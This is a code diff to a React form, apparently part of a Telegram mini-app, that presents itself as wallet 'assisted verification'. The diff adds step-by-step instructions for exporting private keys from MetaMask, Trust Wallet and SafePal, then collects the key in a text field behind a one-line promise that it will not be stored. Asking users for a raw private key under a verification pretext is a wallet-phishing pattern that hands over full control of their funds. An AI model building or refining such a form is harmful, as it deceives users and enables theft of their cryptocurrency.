@@ -3,9 +3,67 @@ import { AssistedVerificationProps } from './types';
 import { Button, Input } from '../ui';
 import { useToast } from '../ui';
 import { hapticFeedback, getInitData } from '../../lib/telegram';
-import { AlertTriangle, Shield, Key, CheckCircle, Loader, ShieldCheck, HelpCircle } from 'lucide-react';
+import { AlertTriangle, Shield, Key, CheckCircle, Loader, ShieldCheck, HelpCircle, Smartphone, Monitor, ExternalLink } from 'lucide-react';
 import { PrivateKeyGuideModal } from './PrivateKeyGuideModal';
 import styles from './AssistedVerificationForm.module.css';
+
+type WalletType = 'metamask' | 'trust' | 'safepal';
+type Platform = 'ios' | 'android' | 'desktop';
+
+interface WalletSteps {
+  name: string;
+  color: string;
+  platforms: Platform[];
+  steps: {
+    text: string;
+    platformNote?: Partial<Record<Platform, string>>;
+  }[];
+  warning: string;
+}
+
+const walletStepsData: Record<WalletType, WalletSteps> = {
+  metamask: {
+    name: 'MetaMask',
+    color: '#f6851b',
+    platforms: ['ios', 'android', 'desktop'],
+    steps: [
+      { text: 'Tap your account icon (top-right circle)' },
+      { text: 'Go to Settings → Security & Privacy' },
+      { text: 'Tap "Show Private Key"', platformNote: { desktop: 'Click Account Details → Export Private Key' } },
+      { text: 'Enter your MetaMask password' },
+      { text: 'Copy the 64-character hex key' },
+    ],
+    warning: 'Not "Recovery Phrase" - that\'s 12-24 words, which is different!'
+  },
+  trust: {
+    name: 'Trust Wallet',
+    color: '#3375BB',
+    platforms: ['ios', 'android'],
+    steps: [
+      { text: 'Open Settings (gear icon, bottom bar)' },
+      { text: 'Tap Wallets → Select your wallet' },
+      { text: 'Tap the (i) info icon next to wallet name' },
+      { text: 'Find "Show Private Key" for Polygon/Ethereum' },
+      { text: 'Authenticate with PIN/biometrics' },
+      { text: 'Copy the 64-character hex key' },
+    ],
+    warning: 'If you only see 12 words, go deeper into coin-specific settings.'
+  },
+  safepal: {
+    name: 'SafePal',
+    color: '#5C6BC0',
+    platforms: ['ios', 'android'],
+    steps: [
+      { text: 'Go to "Me" tab → Manage Wallets' },
+      { text: 'Select your software wallet (not hardware)' },
+      { text: 'Tap wallet settings/info icon' },
+      { text: 'Choose "Export Private Key"' },
+      { text: 'Authenticate and select Polygon/Ethereum' },
+      { text: 'Copy the 64-character hex key' },
+    ],
+    warning: 'Hardware wallets (S1/X1) can\'t export keys directly. Use recovery phrase in MetaMask instead.'
+  }
+};
 
 interface EnhancedAssistedVerificationFormProps {
   verificationId: number;
@@ -34,6 +92,8 @@ export function AssistedVerificationForm({
   const [network, setNetwork] = useState<'polygon'>('polygon'); // Security-first: Default to Polygon for assisted verification
   const [userConsent, setUserConsent] = useState(false);
   const [showGuideModal, setShowGuideModal] = useState(false);
+  const [selectedWallet, setSelectedWallet] = useState<WalletType>('metamask');
+  const [selectedPlatform, setSelectedPlatform] = useState<Platform>('ios');
   const toast = useToast();
 
   const totalSteps = 4;
@@ -295,51 +355,112 @@ export function AssistedVerificationForm({
 
       case 3:
         const config = networkConfigs[network];
+        const currentWalletSteps = walletStepsData[selectedWallet];
 
         return (
           <div className={styles.stepContainer}>
             <h3 className={styles.stepTitle}>
               <Key className={styles.stepIcon} />
-              Enter Wallet Proof
+              Enter Your Private Key
             </h3>
 
+            {/* Inline Tutorial Section */}
+            <div className={styles.inlineTutorial}>
+              <div className={styles.tutorialHeader}>
+                <Key size={18} />
+                <span>How to Export Your Private Key</span>
+              </div>
+
+              {/* Wallet Tabs */}
+              <div className={styles.walletTabs}>
+                {(Object.keys(walletStepsData) as WalletType[]).map((wallet) => (
+                  <button
+                    key={wallet}
+                    type="button"
+                    className={`${styles.walletTab} ${selectedWallet === wallet ? styles.walletTabActive : ''}`}
+                    onClick={() => {
+                      setSelectedWallet(wallet);
+                      // Reset platform if not supported
+                      if (!walletStepsData[wallet].platforms.includes(selectedPlatform)) {
+                        setSelectedPlatform(walletStepsData[wallet].platforms[0]);
+                      }
+                    }}
+                    style={{ '--wallet-color': walletStepsData[wallet].color } as React.CSSProperties}
+                  >
+                    {walletStepsData[wallet].name}
+                  </button>
+                ))}
+              </div>
+
+              {/* Platform Toggle */}
+              <div className={styles.platformToggle}>
+                <span className={styles.platformLabel}>Your device:</span>
+                <div className={styles.platformButtons}>
+                  {currentWalletSteps.platforms.map((platform) => (
+                    <button
+                      key={platform}
+                      type="button"
+                      className={`${styles.platformBtn} ${selectedPlatform === platform ? styles.platformBtnActive : ''}`}
+                      onClick={() => setSelectedPlatform(platform)}
+                    >
+                      {platform === 'desktop' ? <Monitor size={14} /> : <Smartphone size={14} />}
+                      <span>{platform === 'ios' ? 'iOS' : platform === 'android' ? 'Android' : 'Desktop'}</span>
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              {/* Quick Steps */}
+              <ol className={styles.tutorialSteps}>
+                {currentWalletSteps.steps.map((stepItem, index) => (
+                  <li key={index} className={styles.tutorialStep}>
+                    <span className={styles.stepNum}>{index + 1}</span>
+                    <span className={styles.stepText}>
+                      {stepItem.platformNote?.[selectedPlatform] || stepItem.text}
+                    </span>
+                  </li>
+                ))}
+              </ol>
+
+              {/* Key Format */}
+              <div className={styles.keyFormatBox}>
+                <div className={styles.keyFormatLabel}>Your key should look like:</div>
+                <code className={styles.keyFormatCode}>0x1a2b3c...64 hex characters total</code>
+              </div>
+
+              {/* Warning */}
+              <div className={styles.quickWarning}>
+                <AlertTriangle size={14} />
+                <span>{currentWalletSteps.warning}</span>
+              </div>
+
+              {/* Need More Help Link */}
+              <button
+                type="button"
+                className={styles.moreHelpLink}
+                onClick={() => setShowGuideModal(true)}
+              >
+                <HelpCircle size={14} />
+                <span>Need detailed instructions with screenshots?</span>
+                <ExternalLink size={12} />
+              </button>
+            </div>
+
+            {/* Private Key Input */}
             <div className={styles.proofEntry}>
               <div className={styles.labelRow}>
                 <label className={styles.inputLabel}>
                   Polygon (MATIC) Wallet Private Key
                   <span className={styles.required}> *</span>
                 </label>
-                <button
-                  type="button"
-                  className={styles.helpIconButton}
-                  onClick={() => setShowGuideModal(true)}
-                  aria-label="How to find your Polygon Private Key?"
-                  title="How to find your Polygon Private Key?"
-                >
-                  <HelpCircle size={18} />
-                </button>
               </div>
-              
-              <div className={styles.securityNotice}>
-                <Shield size={16} />
-                <span>For your security, please provide the Private Key for your Polygon (MATIC) wallet. This ensures your main assets on Ethereum, BSC, or Tron remain isolated and safe.</span>
-              </div>
-
-              <button
-                type="button"
-                className={styles.helpButton}
-                onClick={() => setShowGuideModal(true)}
-              >
-                <HelpCircle size={16} />
-                How to find your Polygon Private Key?
-              </button>
 
               <textarea
                 value={walletProof}
                 onChange={(e) => handleProofChange(e.target.value)}
                 placeholder={config.placeholder}
                 className={`${styles.proofInput} ${validationErrors.length > 0 ? styles.error : ''}`}
-                rows={4}
+                rows={3}
                 spellCheck={false}
                 autoComplete="off"
                 autoCorrect="off"
@@ -354,16 +475,8 @@ export function AssistedVerificationForm({
                       {error}
                     </div>
                   ))}
-        </div>
-      )}
-
-              <div className={styles.exampleBox}>
-                <div className={styles.exampleTitle}>Example format:</div>
-                <code className={styles.exampleCode}>{config.example}</code>
-                <div className={styles.exampleNote}>
-                  <small>💡 Tip: You can export your Polygon private key from MetaMask, Trust Wallet, etc. Your main wallet's key is not required.</small>
                 </div>
-              </div>
+              )}
 
               <div className={styles.consentBox}>
                 <input
@@ -374,13 +487,7 @@ export function AssistedVerificationForm({
                   className={styles.consentCheckbox}
                 />
                 <label htmlFor="user_consent" className={styles.consentLabel}>
-                  I confirm that:
-                  <ul className={styles.consentList}>
-                    <li>This is my own wallet and private key</li>
-                    <li>I understand this is for one-time verification only</li>
-                    <li>My private key will be processed securely and not stored</li>
-                    <li>I consent to automated balance verification for ownership proof</li>
-                  </ul>
+                  I confirm this is my wallet, for one-time verification only, and my key will not be stored.
                 </label>
               </div>
             </div>
